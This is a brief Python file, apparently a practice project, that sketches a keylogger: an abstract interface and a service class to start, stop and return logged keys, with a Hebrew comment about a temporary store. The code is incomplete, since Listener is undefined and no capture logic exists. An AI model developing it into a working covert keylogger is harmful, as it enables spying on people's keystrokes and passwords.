from abc import ABC, abstractmethod
from typing import List
from i_keylogger import service



class IKeyLogger(ABC):
 @abstractmethod
 def start_logging(self) -> None:
  pass

 @abstractmethod
 def stop_logging(self) -> None:
  pass

 @abstractmethod
 def get_logged_keys(self) -> List[str]:
  pass




class KeyLoggerService(IKeyLogger):
 def __init__(self):
  self._active = False
  self._keys: List[str] = []

 def start_logging(self) -> None:
     Listener.start()
     self._active = True

 def stop_logging(self) -> None:
     Listener.stop()
     self._active = False

 def get_logged_keys(self) -> List[str]:
     #מושך את המידע שקיים במאגר הזמני service שנמצא בקובץ i_keylogger
     return list(service.get_logged_keys())



